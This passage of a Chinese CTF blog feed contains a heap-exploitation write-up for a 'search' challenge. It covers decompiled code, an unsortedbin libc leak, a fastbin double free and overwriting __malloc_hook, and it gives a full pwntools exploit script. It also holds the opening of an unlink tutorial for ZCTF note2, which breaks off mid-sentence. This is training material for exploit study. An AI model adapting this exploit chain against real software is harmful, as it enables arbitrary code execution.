keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true">// 对应sentence的检查内容</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">==</span> size <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">memcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>i<span class="token punctuation">,</span> chunk<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 比对单词</span>      <span class="token punctuation">{</span>        <span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token string">"Found %d: "</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 输出单词所在的sentence</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Delete this sentence (y/n)?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">selfs_read</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token string">'y'</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 清除数据</span>          <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">// 删除对应sentence</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Deleted!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token function">free</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="读取的细节"><a href="#读取的细节" class="headerlink" title="读取的细节"></a>读取的细节</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">selfs_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// er14</span>  <span class="token keyword">int</span> num<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  _BYTE <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbp a1 == ptr  a2 = 48  a3=1    </span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    v3 <span class="token operator">=</span> a3<span class="token punctuation">;</span>    num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v5 <span class="token operator">=</span> <span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>      v6 <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> num<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v5 <span class="token operator">==</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> v3 <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token operator">*</span>v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        num <span class="token operator">=</span> v6 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">&lt;=</span> v6 <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        num <span class="token operator">+</span><span class="token operator">=</span> v6<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">&lt;=</span> num <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token operator">!=</span> a2 <span class="token punctuation">)</span>    <span class="token function">puts_exit</span><span class="token punctuation">(</span><span class="token string">"Not enough data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里是一个self_read 其最后一个参数a3，如果为1那么就会响应’\n’符也就是读到’\n’就停止，并把结尾置NULL<br>a3如果==0 那么不响应’\n’，会读取字符到a2个为止同时也不会有结尾置NULL的操作</p><p>程序功能：</p><ul><li>输入sentence<ul><li>依据空格符分别用malloc(0x28)来记录每一个单词</li><li>每个record_chunk将会形成单向链表</li></ul></li><li>输入search<ul><li>依据输入的word_size和word来查找每一个record_chunk，是否一致</li><li>如果查到了就可以选择是否free掉word对应的sentence</li></ul></li></ul><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><h4 id="绕过search函数"><a href="#绕过search函数" class="headerlink" title="绕过search函数"></a>绕过search函数</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> record<span class="token punctuation">{</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span> ptr_word <span class="token operator">=</span> word_addr<span class="token punctuation">;</span>    _int64 string_nums<span class="token punctuation">;</span>     <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span> ptr_sent <span class="token operator">=</span> sentence_addr<span class="token punctuation">;</span>    _int64 size<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span> ptr_prev <span class="token operator">=</span> <span class="token operator">&amp;</span>prev_record<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><ul><li>if ( **(_BYTE **)(i + 16) ) ：先检查sentence，不能为为NULL</li><li>if ( *(_DWORD *)(i + 8) == size &amp;&amp; !memcmp(*(const void **)i, chunk, size) )// 比对单词  <ul><li>检查单词size 和 word_addr内的单词与我们想查找的</li></ul></li><li>如果在record没找到就会使i=&amp;prev_record 进入下一个结构体查找</li><li>如果找到了，选择free掉对应sentence<ul><li>将sentence_chunk内容清空</li><li>free(sentence_chunk)，但是链表没有消失</li><li>继续查找</li></ul></li></ul><p>如果我们的sentence_chunk属于smallbins那么在free之后会填入unsortedbin表头，即sentence_chunk:<br><img src="https://s1.ax1x.com/2020/10/20/BSNEB4.png" alt=""><br>这样我们在再次search时可以绕过 if ( **(_BYTE **)(i + 16) ) 检查<br>if ( *(_DWORD *)(i + 8) == size &amp;&amp; !memcmp(*(const void **)i, chunk, size) )检查，我们可以通过搜索中的第二个单词来绕过也就是\x00<br>注意别忘记前提：也要在sentence_chunk中放入两个单词，这样才有第二个record_chunk存在。</p><p>如果成功那么将输出sentence_chunk，即泄露unsortedbin地址：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#leak unsorted_addr</span>sentence <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0xf</span>  <span class="token comment" spellcheck="true">#两个单词</span>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span>sentence<span class="token punctuation">)</span>search<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0xf</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>search<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0xf</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#清除sentence_chunk，检索第二个单词</span></code></pre><p>那么我们就可以算出libc地址，获取system_addr或者onegadget_addr</p><p>接下来就想办法把我们的函数写入某个可执行地址中。<br>这里利用了fastbins double free</p><h4 id="fastbins-double-free"><a href="#fastbins-double-free" class="headerlink" title="fastbins double free"></a>fastbins double free</h4><p>我们可以先输入几个在fastbins范围内的sentence：</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token operator">*</span><span class="token number">0x26</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#a</span>add<span class="token punctuation">(</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token operator">*</span><span class="token number">0x26</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#b</span>add<span class="token punctuation">(</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token operator">*</span><span class="token number">0x26</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#c</span>search<span class="token punctuation">(</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token operator">*</span><span class="token number">0x26</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span></code></pre><p>这样我们在search’F’*0x26时可以把这三个都free掉，然后形成fastbins链表：<br><img src="https://s1.ax1x.com/2020/10/20/BSNAuF.png" alt=""><br>那么形成链表后这几个sentence_chunk只有c里面没有数据，a，b两个都有指针fd数据所以可以绕过search第一个检查，同样的我们搜索第二个<br>单词来绕过search第二检查，成功检索后选择删除：<br><img src="https://s1.ax1x.com/2020/10/20/BSNVHJ.png" alt=""><br>这样我们就获得了任意地址写的能力。</p><h4 id="Arbitrary-Alloc-1"><a href="#Arbitrary-Alloc-1" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h4><p>在fastbins double free的基础上获取<strong>malloc_hook附近的chunk，将onegadgte_addr写入</strong>malloc_hook即可</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#+++++++++++++++++++search.py++++++++++++++++++++</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-                           </span><span class="token comment" spellcheck="true">#Author: Squarer</span><span class="token comment" spellcheck="true">#Time: Mon Oct 19 16:03:41 CST 2020</span><span class="token comment" spellcheck="true">#+++++++++++++++++++search.py++++++++++++++++++++</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./search'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#libc = ELF('null')</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># libc=ELF('/lib/i386-linux-gnu/libc.so.6')</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>cont<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'3: Quit\n'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:\n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'word:\n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>cont<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./search'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('ip',port)</span><span class="token comment" spellcheck="true">#leak unsorted_addr</span>sentence <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0xf</span>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span>sentence<span class="token punctuation">)</span>search<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0xf</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>search<span class="token punctuation">(</span><span class="token number">0xf</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0xf</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>unsortedbin_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> unsortedbin_addr <span class="token operator">-</span> <span class="token number">0x3c4b78</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_addr===>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"system_addr====>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token operator">*</span><span class="token number">0x26</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#a</span>add<span class="token punctuation">(</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token operator">*</span><span class="token number">0x26</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#b</span>add<span class="token punctuation">(</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token operator">*</span><span class="token number">0x26</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#c</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>search<span class="token punctuation">(</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token operator">*</span><span class="token number">0x26</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh,'b*0x0400B1F')</span>search<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b*0x400BCB'</span><span class="token punctuation">)</span>hook_chunk_size_addr  <span class="token operator">=</span>  libc_addr <span class="token operator">+</span> <span class="token number">0x3c4af5</span>hook_chunk_addr <span class="token operator">=</span> hook_chunk_size_addr <span class="token operator">-</span> <span class="token number">0x8</span>gadget_off <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span><span class="token number">0x4527a</span><span class="token punctuation">,</span><span class="token number">0xf0364</span><span class="token punctuation">,</span><span class="token number">0xf1207</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> libc_addr <span class="token operator">+</span> gadget_off<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>fake_fd <span class="token operator">=</span> p64<span class="token punctuation">(</span>hook_chunk_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span>fake_fd<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh,'b*0x400C3A')</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"hook_chunk_addr===>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>hook_chunk_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>本来想在<em>\</em>free_hook试一下system_addr的但是因为某个机制finish几次后<em>\</em>free_hook附近的数据都被清除了，所以没成功</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>对于难以堆溢出的，应该考虑程序对于chunk的释放于分配机制，反正主要目标是获取高危区域的chunk,这个题对于search函数的机制 绕过是重难点应该更加偏向逻辑漏洞</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unlink利用</title>
      <link href="/2020/10/18/unlink-li-yong/"/>
      <url>/2020/10/18/unlink-li-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="Unlink源码"><a href="#Unlink源码" class="headerlink" title="Unlink源码"></a>Unlink源码</h2><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* Take a chunk off a bin list. Unlink操作 They are all free chunk*/</span><span class="token comment" spellcheck="true">/*1：检查两个记录chunk p size的字段是否相等2：检查fd，bk是否回指chunk p3：进行unlink4：如果size属于smallbins范围内则结束该函数*/</span><span class="token comment" spellcheck="true">/* Take a chunk off a bin list av==arena P==目标 FD==下一个 BK==前一个*/</span><span class="token macro property">#<span class="token directive keyword">define</span> unlink(AV, P, BK, FD) {                                            \    </span><span class="token comment" spellcheck="true">/*由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。*/</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span><span class="token function">next_chunk</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      \      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               \    <span class="token comment" spellcheck="true">/*获取寻找其他两个chunk*/</span>    FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>                                      \    BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>                                      \    <span class="token comment" spellcheck="true">/*检查：要求fd->bk=p,以及bk->fd=p,两边指中间*/</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              \      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \    <span class="token keyword">else</span> <span class="token punctuation">{</span>                                      \        FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>                                  \        BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>                                  \</code></pre><p>所以对于一般情况下的unlink如果我们能找到一个地方(ptr)指向p，并将p-&gt;fd = ptr-12  p-&gt;bk = ptr-8（32位）,那么我们unlink的过程如下：<br><img src="https://s1.ax1x.com/2020/10/18/0XaEDA.png" alt=""><br>由于后进行BK-&gt;fd = FD;，所以最后：ptr-&gt;p == ptr,即最终p指向了：<br><img src="https://s1.ax1x.com/2020/10/18/0XaKC8.png" alt=""><br>所以在64位下ptr-&gt;p会指向ptr</p><h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><pre class=" language-java"><code class="language-java">matrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>BUU$ checksec note2<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/matrix/PWN/BUU/note2'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span></code></pre><p>PIE关闭</p><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p>菜单功能：</p><ul><li>add：常规创建一个不大于0x80的chunk 其指针放在bss段，记录当时的输入size也保存在bss段<ul><li>读入数据时会排除%符号</li><li>存在无限读取漏洞</li></ul></li><li>show：常规输出bss指针所指向的内容</li><li>edit：先执行一次malloc(0xa0)来printf(tmp_chunk) 